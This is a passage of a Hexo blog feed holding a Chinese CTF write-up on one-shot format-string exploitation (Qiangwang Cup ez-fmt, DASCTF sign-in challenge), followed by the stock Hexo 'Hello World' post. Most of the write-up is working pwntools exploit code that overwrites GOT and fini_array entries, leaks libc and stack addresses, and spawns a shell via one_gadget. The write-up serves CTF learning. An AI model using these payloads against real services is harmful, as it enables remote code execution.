io.sendafter(delim,data)sla  = <span class="keyword">lambda</span> delim, data        : io.sendlineafter(delim, data)r    = <span class="keyword">lambda</span> num=<span class="number">4096</span>           : io.recv(num)ru   = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  : io.recvuntil(delims, drop)itr  = <span class="keyword">lambda</span>                    : io.interactive()r64  = <span class="keyword">lambda</span>                    : io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)r32  = <span class="keyword">lambda</span>                    : io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">4</span>:]uu32 = <span class="keyword">lambda</span> data               : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))uu64 = <span class="keyword">lambda</span> data               : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))leak = <span class="keyword">lambda</span> name, value        : info(<span class="string">"&#123;&#125;:0x&#123;:x&#125;"</span>.<span class="built_in">format</span>(name,value))<span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">cmd=<span class="string">&#x27;&#x27;</span></span>):    gdb.attach(io,cmd)    pause()<span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span> :    pwn_log_level = <span class="string">&#x27;info&#x27;</span>   <span class="comment">#&#x27;info&#x27;</span>    pwn_arch = <span class="string">&#x27;amd64&#x27;</span>    pwn_os = <span class="string">&#x27;linux&#x27;</span>    context(log_level=pwn_log_level, arch=pwn_arch, os=pwn_os)    context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]    pwnfile = <span class="string">&#x27;./fmt&#x27;</span>    <span class="comment">#io = process(pwnfile)</span>    io = remote(<span class="string">&#x27;&#x27;</span>,  )    elf = ELF(pwnfile)    rop = ROP(pwnfile)    libc_name = <span class="string">&#x27;./libc.so.6&#x27;</span>       libc = ELF(libc_name)     fini_arry = <span class="number">0x0403198</span>     main = <span class="number">0x4011ff</span>    printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]    payload = <span class="string">b&#x27;%41$p--%43$paaaa&#x27;</span>  + fmtstr_payload(<span class="number">8</span>, &#123;fini_arry : main&#125;, numbwritten=<span class="number">34</span>)    ru(<span class="string">b&#x27;payload:&#x27;</span>)    <span class="comment"># debug() </span>    io.sendline(payload)    ru(<span class="string">b&#x27;0x&#x27;</span>)    libc_base = <span class="built_in">int</span>(r(<span class="number">12</span>), <span class="number">16</span>) - <span class="number">243</span> - libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]    ru(<span class="string">b&#x27;0x&#x27;</span>)    stack = <span class="built_in">int</span>(r(<span class="number">12</span>), <span class="number">16</span>) - <span class="number">0x2f0</span>      <span class="comment">#0xf0 -0xe0 - 0x120</span>    leak(<span class="string">"libc_base"</span>, libc_base)    leak(<span class="string">"stack"</span>, stack)    one = <span class="number">0xe3b01</span> + libc_base     <span class="comment">#0xe3b01 0xe3b04 0xe3cf6 0x1075aa 0x1075b2 0x1075b7 0x1075c1</span>    payload = fmtstr_payload(<span class="number">6</span>, &#123;stack:one&#125;)    ru(<span class="string">b&#x27;payload:&#x27;</span>)    <span class="comment"># debug()</span>    s(payload)    itr()</code></pre><h2 id="【DASCTF-X-HDCTF-2024-公开赛】签个到吧"><a href="#【DASCTF-X-HDCTF-2024-公开赛】签个到吧" class="headerlink" title="【DASCTF X HDCTF 2024 公开赛】签个到吧"></a>【DASCTF X HDCTF 2024 公开赛】签个到吧</h2><p>非栈上一次性格式化字符串 </p><p>远程环境：2.31-0ubuntu9.15</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406071529364.png" alt="image-20240607152900330"></p><p>给了栈地址 以及0x100长度限制的格式化字符串</p><blockquote><p>思路：改_exit_got为main地址同时泄露libc，然后再改exit_got为one_gadget，退出时执行one_gadget</p></blockquote><p>如何修改got？</p><p>printf时的栈空间  利用rsp+8 处的连续指针 （fmtarg 看相对偏移括号里面的不用管）</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406071611393.png" alt="image-20240607161107350"></p><p>利用二连指针修改任意地址值</p><p>但是下面的payload并不能成功修改got地址   貌似使用%x$定位的话不能在同一条链子上改两次  (test&gt;exit_got)   没有将0x401030改成功</p><pre class=" language-highlight python">payload1  = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(exit_got).encode(<span class="string">&quot;utf-8&quot;</span>) + <span class="string"><code class="language-highlight python">payload1  = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(exit_got).encode(<span class="string">&quot;utf-8&quot;</span>) + <span class="string">b&#x27;c%7$ln&#x27;</span>payload1 += <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(test-exit_got).encode(<span class="string">"utf-8"</span>) + <span class="string">b&#x27;c%49$ln&#x27;</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406071615607.png" alt="image-20240607161549570"></p><p>如果是修改不同链上则可以同时修改</p><pre class=" language-highlight python">payload1  = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(main).encode(<span class="string">&quot;utf-8&quot;</span>) + <span class="string"><code class="language-highlight python">payload1  = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(main).encode(<span class="string">&quot;utf-8&quot;</span>) + <span class="string">b&#x27;c%7$ln&#x27;</span>payload1 += <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(exit_got-main).encode(<span class="string">"utf-8"</span>) + <span class="string">b&#x27;c%8$ln&#x27;</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406071632618.png" alt="image-20240607163238561"></p><p>直接使用格式化字符作为占位符的话可以在一条链子上改两次</p><pre class=" language-highlight python">payload1  = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(exit_got-<span class="number">5</span>).encode(<span class="string">&quot;utf-8&quot;</span>) + <span class="string">b&#x27;c&#x27;</span> + <span class="string">b&#x27;%c&#x27;</span>*<span class="number">5</span> + <span class="string">b&#x27;%n&#x27;</span>   <span class="comment"><code class="language-highlight python">payload1  = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(exit_got-<span class="number">5</span>).encode(<span class="string">&quot;utf-8&quot;</span>) + <span class="string">b&#x27;c&#x27;</span> + <span class="string">b&#x27;%c&#x27;</span>*<span class="number">5</span> + <span class="string">b&#x27;%n&#x27;</span>   <span class="comment">#7</span>payload1 += <span class="string">b&#x27;%5c&#x27;</span> + <span class="string">b&#x27;%c&#x27;</span>*<span class="number">40</span> + <span class="string">b&#x27;%ln&#x27;</span>   <span class="comment">#49</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406071654277.png" alt="image-20240607165447235"></p><p>这样思路就明确了，先利用二连指针的第一个指针修改第二个指针指向exit_got，然后利用第二个指针修改exit_got地址为main函数地址</p><p>由于%hn只将打印出来字符的低二字节修改内存，所以打印出来的字符长度溢出时就能修改低二字节为任意值了</p><pre class=" language-highlight python">payload1  = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(exit_got-<span class="number">5</span>).encode(<span class="string">&quot;utf-8&quot;</span>) + <span class="string">b&#x27;c&#x27;</span> + <span class="string">b&#x27;%c&#x27;</span>*<span class="number">5</span> + <span class="string">b&#x27;%ln&#x27;</span>   <span class="comment"><code class="language-highlight python">payload1  = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(exit_got-<span class="number">5</span>).encode(<span class="string">&quot;utf-8&quot;</span>) + <span class="string">b&#x27;c&#x27;</span> + <span class="string">b&#x27;%c&#x27;</span>*<span class="number">5</span> + <span class="string">b&#x27;%ln&#x27;</span>   <span class="comment">#7</span>payload1 += <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="number">0xd1fb</span>).encode(<span class="string">"utf-8"</span>) + <span class="string">b&#x27;c&#x27;</span> + <span class="string">b&#x27;%c&#x27;</span>*<span class="number">40</span> + <span class="string">b&#x27;%hn&#x27;</span>   <span class="comment">#49</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406071712038.png" alt="image-20240607171232992"></p><p>然后栈上还残留的指向exit_got指针来修改成为one_gadget</p><pre class=" language-highlight python"><span class="comment"><code class="language-highlight python"><span class="comment">#coding:utf-8</span><span class="keyword">from</span> pwn <span class="keyword">import</span> *<span class="keyword">from</span> tw11ty <span class="keyword">import</span> *<span class="comment">#from ctypes import *</span><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span> :    context.log_level = <span class="string">&#x27;info&#x27;</span>    IPort = <span class="string">&#x27;node5.buuoj.cn 29958&#x27;</span>    pwnfile = <span class="string">&#x27;./pwn&#x27;</span>    libc_name = <span class="string">&#x27;/ctf/work/glibc-all-in-one/libs/2.31-0ubuntu9.15_amd64/libc.so.6&#x27;</span>     <span class="comment"># libc_name = &#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>    elf  = ELF(pwnfile)    rop  = ROP(pwnfile)    libc = ELF(libc_name)    <span class="keyword">while</span>(<span class="literal">True</span>):        io = init(pwnfile, IPort, libc_name)        exit_got = elf.got[<span class="string">&#x27;_exit&#x27;</span>]        main     = elf.sym[<span class="string">&#x27;main&#x27;</span>]        ru(<span class="string">b&#x27;Gift addr: &#x27;</span>)        stack = <span class="built_in">int</span>(r(<span class="number">12</span>), <span class="number">16</span>)        leak(<span class="string">"stack"</span>, stack)        payload1  = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(exit_got-<span class="number">5</span>).encode(<span class="string">"utf-8"</span>) + <span class="string">b&#x27;c&#x27;</span> + <span class="string">b&#x27;%c&#x27;</span>*<span class="number">5</span> + <span class="string">b&#x27;%ln&#x27;</span>   <span class="comment">#7</span>        payload1 += <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="number">0xd1fb</span>).encode(<span class="string">"utf-8"</span>) + <span class="string">b&#x27;c&#x27;</span> + <span class="string">b&#x27;%c&#x27;</span>*<span class="number">40</span> + <span class="string">b&#x27;%hn&#x27;</span>   <span class="comment">#49</span>        payload1 += <span class="string">b&#x27;-%17$p&#x27;</span>        <span class="comment"># debug(&#x27;b *0x401366&#x27;)</span>        sla(<span class="string">b&#x27;Please leave your message: &#x27;</span>, payload1)         ru(<span class="string">b&#x27;0x&#x27;</span>)        libc_base = <span class="built_in">int</span>(r(<span class="number">12</span>), <span class="number">16</span>) - <span class="number">243</span> - libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]        one_gadegt = [<span class="number">0xe3afe</span>, <span class="number">0xe3b01</span>, <span class="number">0xe3b04</span>]        one = libc_base + one_gadegt[<span class="number">1</span>]        ori  = one&<span class="number">0xffff</span>        ori1 = one>><span class="number">16</span>&<span class="number">0xffff</span>          ori2 = one>><span class="number">32</span>&<span class="number">0xffff</span>        ori3 = one&<span class="number">0xffffffff</span>        leak(<span class="string">"one_gadet"</span>, one)        <span class="built_in">print</span>(<span class="built_in">hex</span>(ori))        <span class="built_in">print</span>(<span class="built_in">hex</span>(ori1))        <span class="built_in">print</span>(<span class="built_in">hex</span>(ori2))        <span class="keyword">if</span>(ori < ori1 <span class="keyword">or</span> ori1 < ori2):            log.failure(<span class="string">"ori is too low..."</span>)            io.close()            <span class="keyword">continue</span>        <span class="keyword">else</span> :            payload2  = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(exit_got+<span class="number">2</span>-<span class="number">35</span>).encode(<span class="string">"utf-8"</span>) + <span class="string">b&#x27;c&#x27;</span> + <span class="string">b&#x27;%c&#x27;</span>*<span class="number">35</span> + <span class="string">b&#x27;%ln\x00&#x27;</span>  <span class="comment">#37</span>            <span class="comment"># payload2 = b&#x27;\x00&#x27;</span>            sla(<span class="string">b&#x27;Please leave your message: &#x27;</span>, payload2)             <span class="comment"># debug(&#x27;b *0x401366&#x27;)</span>            payload3 = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(exit_got+<span class="number">4</span>-<span class="number">14</span>).encode(<span class="string">"utf-8"</span>) + <span class="string">b&#x27;c&#x27;</span> + <span class="string">b&#x27;%c&#x27;</span>*<span class="number">14</span> + <span class="string">b&#x27;%ln\x00&#x27;</span>   <span class="comment">#16</span>            <span class="comment"># payload3 = b&#x27;\x00&#x27;</span>            <span class="comment"># debug(&#x27;b *0x401366&#x27;)</span>            sla(<span class="string">b&#x27;Please leave your message: &#x27;</span>, payload3)             payload4  = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(ori2-<span class="number">38</span>).encode(<span class="string">"utf-8"</span>) + <span class="string">b&#x27;c&#x27;</span> + <span class="string">b&#x27;%c&#x27;</span>*<span class="number">38</span> + <span class="string">b&#x27;%hn&#x27;</span>       <span class="comment">#40-->4  7fxx   82-->2  xxxx    85-->0   xxxx</span>            payload4 += <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(ori1-ori2-<span class="number">40</span>).encode(<span class="string">"utf-8"</span>) + <span class="string">b&#x27;c&#x27;</span> + <span class="string">b&#x27;%c&#x27;</span>*<span class="number">40</span> + <span class="string">b&#x27;%hn&#x27;</span>             payload4 += <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(ori-ori1-<span class="number">1</span>).encode(<span class="string">"utf-8"</span>)   + <span class="string">b&#x27;c&#x27;</span> + <span class="string">b&#x27;%c&#x27;</span> + <span class="string">b&#x27;%hn&#x27;</span>             payload4 += <span class="string">b&#x27;\x00&#x27;</span>             <span class="comment"># debug(&#x27;b *0x401366&#x27;)</span>            sla(<span class="string">b&#x27;Please leave your message: &#x27;</span>, payload4)             <span class="built_in">print</span>(payload4)            itr()</code></pre><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406081607924.png" alt="image-20240608160741823"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结:"></a>总结:</h2><ol><li>一次性格式化除非是给了backdoor或者libc基地址，否则一次性是很难打通的，当然不排除一些奇奇怪怪的题目。基本上只给了一个一次性格式化利用的话，都需要构造出第二次利用，无论是改got、fini_array、printf_ret、ret_addr。</li><li>栈上格式化字符串直接写地址改数据，非栈上格式化字符串改指针间接改数据</li></ol><h2 id="一些思考"><a href="#一些思考" class="headerlink" title="一些思考"></a>一些思考</h2><blockquote><p>有群u在群里请教了为什么不能用$符号定位使用两次，然后在一条链子上改两次，我在上面的das签到题里面有了些自己的测试，不过还是不如群里的大佬理解得透彻。</p><p>自己整理了一下<a href="https://www.cnblogs.com/9man/p/18228214">.N1nEmAn</a>师傅所说的原理：打格式化字符串时，使用$符号作为索引，会将栈的上下文保存到堆上，第一次使用$符号修改目标能正常修改栈上数据，但是堆上的数据没有变，而下次再使用$符号作为索引，会到堆里面去进行修改，而不是在栈上直接修改。这就是为什么不能在同一条链子上改两次。后面也有<a href="https://blog.wjhwjhn.com/posts/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/">WJH</a>师傅贴出的博客，里面是WJH师傅对printf的源码分析。这就是与大佬们学习的差距吗，再接再厉！</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;一次性格式化字符串&quot;&gt;&lt;a href=&quot;#一次性格式化字符串&quot; class=&quot;headerlink&quot; title=&quot;一次性格式化字符串&quot;&gt;&lt;/a&gt;一次性格式化字符串&lt;/h1&gt;&lt;h2 id=&quot;【2023-强网杯】ez-fmt&quot;&gt;&lt;a href=&quot;#【2023-强网杯</summary>
      
    
    
    
    
    <category term="fmt" scheme="http://example.com/tags/fmt/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://example.com/2024/06/06/hello-world/"/>
    <id>http://example.com/2024/06/06/hello-world/</id>
    <published>2024-06-06T09:15:58.683Z</published>
    <updated>2024-06-07T06:44:03.782Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre class=" language-highlight bash">$ hexo new <span class="string"><code class="language-highlight bash">$ hexo new <span class="string">"My New Post"</span></code></pre><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre class=" language-highlight bash"><code class="language-highlight bash">$ hexo server</code></pre><pre class=" language-highlight python"><span class="built_in">print</span>(<span class="string"><code class="language-highlight python"><span class="built_in">print</span>(<span class="string">"hello world"</span>)<span class="keyword">def</span> <span class="title function_">hello_world</span>():    <span class="built_in">print</span>(<span class="string">"hello world"</span>)    <span class="keyword">return</span> <span class="string">"hello world"</span></code></pre><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre class=" language-highlight bash"><code class="language-highlight bash">$ hexo generate</code></pre><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre class=" language-highlight bash"><code class="language-highlight bash">$ hexo deploy</code></pre><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot;&gt;documentation&lt;/a&gt; for</summary>
      
    
    
    
    
  </entry>
  
</feed>
